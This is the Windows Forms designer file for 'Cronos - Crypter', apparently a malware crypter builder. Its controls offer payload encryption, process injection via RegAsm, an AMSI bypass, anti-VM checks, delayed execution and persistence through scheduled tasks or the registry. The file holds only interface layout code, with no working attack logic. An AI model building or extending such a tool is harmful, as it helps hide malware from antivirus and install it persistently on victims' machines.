
namespace CronosCrypter
{
    partial class MainFrm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.topPanel = new System.Windows.Forms.Panel();
            this.sleepNum = new System.Windows.Forms.NumericUpDown();
            this.assemblyBtn = new System.Windows.Forms.Button();
            this.buildBtn = new System.Windows.Forms.Button();
            this.sleepChk = new System.Windows.Forms.CheckBox();
            this.antiVM = new System.Windows.Forms.CheckBox();
            this.amsiBox = new System.Windows.Forms.CheckBox();
            this.schtasksChk = new System.Windows.Forms.CheckBox();
            this.regeditChk = new System.Windows.Forms.CheckBox();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.runpeTypeBox = new System.Windows.Forms.ComboBox();
            this.label11 = new System.Windows.Forms.Label();
            this.encryptionTypeBox = new System.Windows.Forms.ComboBox();
            this.label10 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.regeditNameTxt = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.schtasksNameTxt = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.foldernameTxt = new System.Windows.Forms.TextBox();
            this.specialBox = new System.Windows.Forms.ComboBox();
            this.label6 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.filenameTxt = new System.Windows.Forms.TextBox();
            this.browsePayloadBtn = new System.Windows.Forms.Button();
            this.label4 = new System.Windows.Forms.Label();
            this.payloadTxt = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.exitBox = new System.Windows.Forms.PictureBox();
            this.minimizeBox = new System.Windows.Forms.PictureBox();
            this.TalosSec = new System.Windows.Forms.LinkLabel();
            this.topPanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.sleepNum)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.exitBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.minimizeBox)).BeginInit();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(3, 10);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(132, 21);
            this.label1.TabIndex = 0;
            this.label1.Text = "Cronos - Crypter";
            // 
            // topPanel
            // 
            this.topPanel.Controls.Add(this.TalosSec);
            this.topPanel.Controls.Add(this.sleepNum);
            this.topPanel.Controls.Add(this.assemblyBtn);
            this.topPanel.Controls.Add(this.buildBtn);
            this.topPanel.Controls.Add(this.sleepChk);
            this.topPanel.Controls.Add(this.antiVM);
            this.topPanel.Controls.Add(this.amsiBox);
            this.topPanel.Controls.Add(this.schtasksChk);
            this.topPanel.Controls.Add(this.regeditChk);
            this.topPanel.Controls.Add(this.label13);
            this.topPanel.Controls.Add(this.label12);
            this.topPanel.Controls.Add(this.runpeTypeBox);
            this.topPanel.Controls.Add(this.label11);
            this.topPanel.Controls.Add(this.encryptionTypeBox);
            this.topPanel.Controls.Add(this.label10);
            this.topPanel.Controls.Add(this.label9);
            this.topPanel.Controls.Add(this.regeditNameTxt);
            this.topPanel.Controls.Add(this.label8);
            this.topPanel.Controls.Add(this.schtasksNameTxt);
            this.topPanel.Controls.Add(this.label7);
            this.topPanel.Controls.Add(this.foldernameTxt);
            this.topPanel.Controls.Add(this.specialBox);
            this.topPanel.Controls.Add(this.label6);
            this.topPanel.Controls.Add(this.label5);
            this.topPanel.Controls.Add(this.filenameTxt);
            this.topPanel.Controls.Add(this.browsePayloadBtn);
            this.topPanel.Controls.Add(this.label4);
            this.topPanel.Controls.Add(this.payloadTxt);
            this.topPanel.Controls.Add(this.label3);
            this.topPanel.Controls.Add(this.label2);
            this.topPanel.Controls.Add(this.exitBox);
            this.topPanel.Controls.Add(this.minimizeBox);
            this.topPanel.Controls.Add(this.label1);
            this.topPanel.Dock = System.Windows.Forms.DockStyle.Fill;
            this.topPanel.ForeColor = System.Drawing.Color.Coral;
            this.topPanel.Location = new System.Drawing.Point(0, 0);
            this.topPanel.Name = "topPanel";
            this.topPanel.Size = new System.Drawing.Size(446, 670);
            this.topPanel.TabIndex = 1;
            this.topPanel.MouseDown += new System.Windows.Forms.MouseEventHandler(this.topPanel_MouseDown);
            this.topPanel.MouseMove += new System.Windows.Forms.MouseEventHandler(this.topPanel_MouseMove);
            this.topPanel.MouseUp += new System.Windows.Forms.MouseEventHandler(this.topPanel_MouseUp);
            // 
            // sleepNum
            // 
            this.sleepNum.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.sleepNum.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.sleepNum.Enabled = false;
            this.sleepNum.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.sleepNum.ForeColor = System.Drawing.Color.White;
            this.sleepNum.Location = new System.Drawing.Point(307, 556);
            this.sleepNum.Maximum = new decimal(new int[] {
            2147483647,
            0,
            0,
            0});
            this.sleepNum.Name = "sleepNum";
            this.sleepNum.Size = new System.Drawing.Size(120, 22);
            this.sleepNum.TabIndex = 33;
            // 
            // assemblyBtn
            // 
            this.assemblyBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.assemblyBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.assemblyBtn.ForeColor = System.Drawing.Color.White;
            this.assemblyBtn.Location = new System.Drawing.Point(12, 629);
            this.assemblyBtn.Name = "assemblyBtn";
            this.assemblyBtn.Size = new System.Drawing.Size(75, 29);
            this.assemblyBtn.TabIndex = 32;
            this.assemblyBtn.Text = "Assembly";
            this.assemblyBtn.UseVisualStyleBackColor = false;
            this.assemblyBtn.Click += new System.EventHandler(this.assemblyBtn_Click);
            // 
            // buildBtn
            // 
            this.buildBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.buildBtn.Enabled = false;
            this.buildBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buildBtn.ForeColor = System.Drawing.Color.White;
            this.buildBtn.Location = new System.Drawing.Point(359, 629);
            this.buildBtn.Name = "buildBtn";
            this.buildBtn.Size = new System.Drawing.Size(75, 29);
            this.buildBtn.TabIndex = 31;
            this.buildBtn.Text = "Build";
            this.buildBtn.UseVisualStyleBackColor = false;
            this.buildBtn.Click += new System.EventHandler(this.buildBtn_Click);
            // 
            // sleepChk
            // 
            this.sleepChk.AutoSize = true;
            this.sleepChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.sleepChk.ForeColor = System.Drawing.Color.White;
            this.sleepChk.Location = new System.Drawing.Point(307, 529);
            this.sleepChk.Name = "sleepChk";
            this.sleepChk.Size = new System.Drawing.Size(112, 21);
            this.sleepChk.TabIndex = 30;
            this.sleepChk.Text = "Execution delay";
            this.sleepChk.UseVisualStyleBackColor = true;
            this.sleepChk.CheckedChanged += new System.EventHandler(this.sleepChk_CheckedChanged);
            // 
            // antiVM
            // 
            this.antiVM.AutoSize = true;
            this.antiVM.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.antiVM.ForeColor = System.Drawing.Color.White;
            this.antiVM.Location = new System.Drawing.Point(161, 556);
            this.antiVM.Name = "antiVM";
            this.antiVM.Size = new System.Drawing.Size(66, 21);
            this.antiVM.TabIndex = 29;
            this.antiVM.Text = "AntiVM";
            this.antiVM.UseVisualStyleBackColor = true;
            // 
            // amsiBox
            // 
            this.amsiBox.AutoSize = true;
            this.amsiBox.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.amsiBox.ForeColor = System.Drawing.Color.White;
            this.amsiBox.Location = new System.Drawing.Point(161, 529);
            this.amsiBox.Name = "amsiBox";
            this.amsiBox.Size = new System.Drawing.Size(97, 21);
            this.amsiBox.TabIndex = 28;
            this.amsiBox.Text = "AMSI Bypass";
            this.amsiBox.UseVisualStyleBackColor = true;
            // 
            // schtasksChk
            // 
            this.schtasksChk.AutoSize = true;
            this.schtasksChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.schtasksChk.ForeColor = System.Drawing.Color.White;
            this.schtasksChk.Location = new System.Drawing.Point(41, 556);
            this.schtasksChk.Name = "schtasksChk";
            this.schtasksChk.Size = new System.Drawing.Size(77, 21);
            this.schtasksChk.TabIndex = 27;
            this.schtasksChk.Text = "Schtasks";
            this.schtasksChk.UseVisualStyleBackColor = true;
            this.schtasksChk.CheckedChanged += new System.EventHandler(this.schtasksBox_CheckedChanged);
            // 
            // regeditChk
            // 
            this.regeditChk.AutoSize = true;
            this.regeditChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.regeditChk.ForeColor = System.Drawing.Color.White;
            this.regeditChk.Location = new System.Drawing.Point(41, 529);
            this.regeditChk.Name = "regeditChk";
            this.regeditChk.Size = new System.Drawing.Size(71, 21);
            this.regeditChk.TabIndex = 26;
            this.regeditChk.Text = "Registry";
            this.regeditChk.UseVisualStyleBackColor = true;
            this.regeditChk.CheckedChanged += new System.EventHandler(this.regeditChk_CheckedChanged);
            // 
            // label13
            // 
            this.label13.BackColor = System.Drawing.Color.White;
            this.label13.ForeColor = System.Drawing.Color.White;
            this.label13.Location = new System.Drawing.Point(12, 595);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(422, 2);
            this.label13.TabIndex = 25;
            this.label13.Text = "label13";
            // 
            // label12
            // 
            this.label12.BackColor = System.Drawing.Color.White;
            this.label12.ForeColor = System.Drawing.Color.White;
            this.label12.Location = new System.Drawing.Point(12, 508);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(422, 2);
            this.label12.TabIndex = 24;
            this.label12.Text = "label12";
            // 
            // runpeTypeBox
            // 
            this.runpeTypeBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.runpeTypeBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.runpeTypeBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.runpeTypeBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.runpeTypeBox.ForeColor = System.Drawing.Color.White;
            this.runpeTypeBox.FormattingEnabled = true;
            this.runpeTypeBox.Items.AddRange(new object[] {
            "RegAsm",
            "Itself"});
            this.runpeTypeBox.Location = new System.Drawing.Point(28, 470);
            this.runpeTypeBox.Name = "runpeTypeBox";
            this.runpeTypeBox.Size = new System.Drawing.Size(381, 24);
            this.runpeTypeBox.TabIndex = 23;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label11.ForeColor = System.Drawing.Color.White;
            this.label11.Location = new System.Drawing.Point(24, 446);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(161, 21);
            this.label11.TabIndex = 22;
            this.label11.Text = "Process injection type:";
            // 
            // encryptionTypeBox
            // 
            this.encryptionTypeBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.encryptionTypeBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.encryptionTypeBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.encryptionTypeBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.encryptionTypeBox.ForeColor = System.Drawing.Color.White;
            this.encryptionTypeBox.FormattingEnabled = true;
            this.encryptionTypeBox.Items.AddRange(new object[] {
            "AES",
            "XOR"});
            this.encryptionTypeBox.Location = new System.Drawing.Point(28, 419);
            this.encryptionTypeBox.Name = "encryptionTypeBox";
            this.encryptionTypeBox.Size = new System.Drawing.Size(381, 24);
            this.encryptionTypeBox.TabIndex = 21;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label10.ForeColor = System.Drawing.Color.White;
            this.label10.Location = new System.Drawing.Point(24, 395);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(119, 21);
            this.label10.TabIndex = 20;
            this.label10.Text = "Encryption type:";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label9.ForeColor = System.Drawing.Color.White;
            this.label9.Location = new System.Drawing.Point(24, 344);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(112, 21);
            this.label9.TabIndex = 19;
            this.label9.Text = "Registry name:";
            // 
            // regeditNameTxt
            // 
            this.regeditNameTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.regeditNameTxt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.regeditNameTxt.Enabled = false;
            this.regeditNameTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.regeditNameTxt.ForeColor = System.Drawing.Color.White;
            this.regeditNameTxt.Location = new System.Drawing.Point(28, 368);
            this.regeditNameTxt.Multiline = true;
            this.regeditNameTxt.Name = "regeditNameTxt";
            this.regeditNameTxt.Size = new System.Drawing.Size(381, 24);
            this.regeditNameTxt.TabIndex = 18;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(24, 294);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(171, 21);
            this.label8.TabIndex = 17;
            this.label8.Text = "Scheduled tasks name:";
            // 
            // schtasksNameTxt
            // 
            this.schtasksNameTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.schtasksNameTxt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.schtasksNameTxt.Enabled = false;
            this.schtasksNameTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.schtasksNameTxt.ForeColor = System.Drawing.Color.White;
            this.schtasksNameTxt.Location = new System.Drawing.Point(28, 318);
            this.schtasksNameTxt.Multiline = true;
            this.schtasksNameTxt.Name = "schtasksNameTxt";
            this.schtasksNameTxt.Size = new System.Drawing.Size(381, 24);
            this.schtasksNameTxt.TabIndex = 16;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(24, 244);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(100, 21);
            this.label7.TabIndex = 15;
            this.label7.Text = "Folder name:";
            // 
            // foldernameTxt
            // 
            this.foldernameTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.foldernameTxt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.foldernameTxt.Enabled = false;
            this.foldernameTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.foldernameTxt.ForeColor = System.Drawing.Color.White;
            this.foldernameTxt.Location = new System.Drawing.Point(28, 268);
            this.foldernameTxt.Multiline = true;
            this.foldernameTxt.Name = "foldernameTxt";
            this.foldernameTxt.Size = new System.Drawing.Size(381, 24);
            this.foldernameTxt.TabIndex = 14;
            // 
            // specialBox
            // 
            this.specialBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.specialBox.Enabled = false;
            this.specialBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.specialBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.specialBox.ForeColor = System.Drawing.Color.White;
            this.specialBox.FormattingEnabled = true;
            this.specialBox.Location = new System.Drawing.Point(28, 220);
            this.specialBox.Name = "specialBox";
            this.specialBox.Size = new System.Drawing.Size(381, 24);
            this.specialBox.TabIndex = 13;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(24, 196);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(169, 21);
            this.label6.TabIndex = 12;
            this.label6.Text = "Special folder directory:";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(24, 146);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(82, 21);
            this.label5.TabIndex = 10;
            this.label5.Text = "File name:";
            // 
            // filenameTxt
            // 
            this.filenameTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.filenameTxt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.filenameTxt.Enabled = false;
            this.filenameTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.filenameTxt.ForeColor = System.Drawing.Color.White;
            this.filenameTxt.Location = new System.Drawing.Point(28, 170);
            this.filenameTxt.Multiline = true;
            this.filenameTxt.Name = "filenameTxt";
            this.filenameTxt.Size = new System.Drawing.Size(381, 24);
            this.filenameTxt.TabIndex = 9;
            // 
            // browsePayloadBtn
            // 
            this.browsePayloadBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.browsePayloadBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.browsePayloadBtn.ForeColor = System.Drawing.Color.White;
            this.browsePayloadBtn.Location = new System.Drawing.Point(334, 89);
            this.browsePayloadBtn.Name = "browsePayloadBtn";
            this.browsePayloadBtn.Size = new System.Drawing.Size(75, 29);
            this.browsePayloadBtn.TabIndex = 7;
            this.browsePayloadBtn.Text = "Browse";
            this.browsePayloadBtn.UseVisualStyleBackColor = false;
            this.browsePayloadBtn.Click += new System.EventHandler(this.browsePayloadBtn_Click);
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Franklin Gothic Medium", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(24, 62);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(70, 21);
            this.label4.TabIndex = 6;
            this.label4.Text = "Payload:";
            // 
            // payloadTxt
            // 
            this.payloadTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
            this.payloadTxt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.payloadTxt.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.payloadTxt.ForeColor = System.Drawing.Color.White;
            this.payloadTxt.Location = new System.Drawing.Point(28, 89);
            this.payloadTxt.Multiline = true;
            this.payloadTxt.Name = "payloadTxt";
            this.payloadTxt.Size = new System.Drawing.Size(282, 28);
            this.payloadTxt.TabIndex = 5;
            // 
            // label3
            // 
            this.label3.BackColor = System.Drawing.Color.White;
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(12, 136);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(422, 2);
            this.label3.TabIndex = 4;
            this.label3.Text = "label3";
            // 
            // label2
            // 
            this.label2.BackColor = System.Drawing.Color.White;
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(12, 56);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(422, 2);
            this.label2.TabIndex = 3;
            this.label2.Text = "label2";
            // 
            // exitBox
            // 
            this.exitBox.Image = global::CronosCrypter.Properties.Resources.close_button;
            this.exitBox.Location = new System.Drawing.Point(415, 9);
            this.exitBox.Name = "exitBox";
            this.exitBox.Size = new System.Drawing.Size(25, 25);
            this.exitBox.TabIndex = 2;
            this.exitBox.TabStop = false;
            this.exitBox.Click += new System.EventHandler(this.exitBox_Click);
            // 
            // minimizeBox
            // 
            this.minimizeBox.Image = global::CronosCrypter.Properties.Resources.minus_sign;
            this.minimizeBox.Location = new System.Drawing.Point(384, 9);
            this.minimizeBox.Name = "minimizeBox";
            this.minimizeBox.Size = new System.Drawing.Size(25, 25);
            this.minimizeBox.TabIndex = 1;
            this.minimizeBox.TabStop = false;
            this.minimizeBox.Click += new System.EventHandler(this.minimizeBox_Click);
            // 
            // TalosSec
            // 
            this.TalosSec.AutoSize = true;
            this.TalosSec.Location = new System.Drawing.Point(4, 31);
            this.TalosSec.Name = "TalosSec";
            this.TalosSec.Size = new System.Drawing.Size(52, 13);
            this.TalosSec.TabIndex = 34;
            this.TalosSec.TabStop = true;
            this.TalosSec.Text = "TalosSec";
            this.TalosSec.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.TalosSec_LinkClicked);
            // 
            // MainFrm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.ClientSize = new System.Drawing.Size(446, 670);
            this.Controls.Add(this.topPanel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "MainFrm";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Cronos - Crypter";
            this.topPanel.ResumeLayout(false);
            this.topPanel.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.sleepNum)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.exitBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.minimizeBox)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Panel topPanel;
        private System.Windows.Forms.PictureBox minimizeBox;
        private System.Windows.Forms.PictureBox exitBox;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox payloadTxt;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Button browsePayloadBtn;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.ComboBox specialBox;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TextBox filenameTxt;
        private System.Windows.Forms.CheckBox amsiBox;
        private System.Windows.Forms.CheckBox schtasksChk;
        private System.Windows.Forms.CheckBox regeditChk;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.ComboBox runpeTypeBox;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.ComboBox encryptionTypeBox;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.TextBox regeditNameTxt;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.TextBox schtasksNameTxt;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.TextBox foldernameTxt;
        private System.Windows.Forms.CheckBox sleepChk;
        private System.Windows.Forms.CheckBox antiVM;
        private System.Windows.Forms.Button assemblyBtn;
        private System.Windows.Forms.Button buildBtn;
        private System.Windows.Forms.NumericUpDown sleepNum;
        private System.Windows.Forms.LinkLabel TalosSec;
    }
}

